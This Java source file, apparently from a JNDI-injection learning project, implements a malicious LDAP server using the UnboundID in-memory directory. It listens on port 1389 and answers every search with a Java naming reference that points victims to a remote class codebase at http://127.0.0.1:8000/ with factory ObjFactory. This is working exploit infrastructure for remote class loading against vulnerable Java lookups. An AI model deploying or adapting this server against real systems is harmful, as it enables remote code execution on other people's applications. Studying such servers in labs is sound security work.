package run.ergou.jndi.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPServerWithReference {
    private final static String baseDN = "dc=ergou,dc=run";

    public static void main(String[] args) throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(baseDN);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listenName",
                InetAddress.getByName("0.0.0.0"),
                1389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));
        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer inMemoryDirectoryServer = new InMemoryDirectoryServer(config);
        inMemoryDirectoryServer.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            Entry entry = new Entry(baseDN);
            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaClassName", "Obj");
            entry.addAttribute("javaCodeBase", "http://127.0.0.1:8000/");
            entry.addAttribute("javaFactory", "ObjFactory");

            try {
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception exception) {
                exception.printStackTrace();
            }

        }


    }
}
